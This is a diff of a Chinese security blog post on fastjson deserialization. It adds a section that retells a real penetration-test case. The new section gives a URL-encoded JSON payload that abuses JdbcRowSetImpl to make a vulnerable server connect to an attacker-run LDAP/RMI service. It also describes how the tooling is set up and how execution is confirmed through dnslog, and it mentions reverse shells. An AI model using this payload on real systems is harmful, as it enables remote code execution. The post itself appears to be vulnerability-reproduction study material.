@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.2k</span>
+            <span class="post-count">2.6k</span>
         </span>
     </span>
 
@@ -99,7 +99,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">10 分钟</span>
+            <span class="post-count">11 分钟</span>
         </span>
     </span>
 </div>
@@ -188,7 +188,7 @@
 
 <h3 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h3><hr>
 <p>com.sun.rowset.jdbcRowSetImpl这个类可以被利用，这个类里面有很多setxxxx()方法，我们需要利用的则是setDataSourceName()和setAutoCommit()方法。 </p>
-<p><strong>jdbcRowSetimpl.setDataSourceName</strong></p>
+<h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><p><strong>jdbcRowSetimpl.setDataSourceName</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> (!<span class="keyword">this</span>.getDataSourceName().equals(var1)) &#123;</span><br><span class="line">               <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">               <span class="keyword">this</span>.conn = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.ps = <span class="keyword">null</span>;</span><br><span class="line">               <span class="keyword">this</span>.rs = <span class="keyword">null</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">super</span>.setDataSourceName(var1);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到setDataSourceName()方法调用了父类中的setDataSourceName()方法，传入var1参数。</p>
@@ -218,6 +218,28 @@
 
 <p>可以看到命令成功执行</p>
 <p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211110110216214.png" alt="image-20211110110216214"></p>
+<h4 id="实战利用-这里的fastjson版本为1-2-21"><a href="#实战利用-这里的fastjson版本为1-2-21" class="headerlink" title="实战利用(这里的fastjson版本为1.2.21)"></a>实战利用(这里的fastjson版本为1.2.21)</h4><hr>
+<p>在做某基金项目时公司前辈使用fastjson反序列化实现了RCE，所以下来对该漏洞进行了复现</p>
+<p>这是漏洞触发点，可以看到是个查询接口</p>
+<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111211609793.png" alt="image-20211111211609793"></p>
+<p>该查询接口发现使用query参数(query_list)，将query参数格式设置为错误格式，比如删除其中的中括号或花括号</p>
+<p>这里删掉啦最后的花括号，可以看到报错返回fastjson版本为1.2.41</p>
+<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111212405478.png" alt="image-20211111212405478"></p>
+<p>这里使用dnslog来验证是否命令执行成功</p>
+<p>在dnslog平台上获取域名</p>
+<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111215010686.png" alt="image-20211111215010686"></p>
+<p>将JNDIExpoit工具放到自己的公网服务器上，并开启IDAP和RMI服务(注意jdk版本)</p>
+<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111220410004.png" alt="image-20211111220410004"></p>
+<p>构造query参数加载jdbcSetRowimpl类设置dataSourceName为指定的LDAP服务或者RMI服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%7B%22ss%22:%7B%22@type%22:%22com.alibaba.fastjson.JSONObject%22,%7B%0A%20%20%20%20%22a%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22java.lang.Class%22,%0A%20%20%20%20%20%20%20%22val%22:%22com.sun.rowset.jdbcRowSetimpl%22%0A%20%20%20%20%7D,%0A%20%20%20%20%22b%22:%7B%0A%20%20%20%20%20%20%20%22@type%22:%22com.sun.rowset.jdbcRowSetimpl%22,%0A%20%20%20%20%20%20%20%22dataSourceName%22:%22idap://公网服务器ip地址:1389/do9ouu%22,%0A%20%20%20%20%20%20%20%22autoCommit%22:true%0A%20%20%20%20%7D%0A%7D%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<p>构造的json利用poc如下:</p>
+<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221213814.png" alt="image-20211111221213814"></p>
+<p>发包后可看到dnslog上有DNS解析，证明命令执行成功</p>
+<p><img src="/2021/11/09/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20211111221622063.png" alt="image-20211111221622063"></p>
+<p>命令执行也可以设置为反弹shell造成RCE。</p>
  
       <!-- reward -->
       
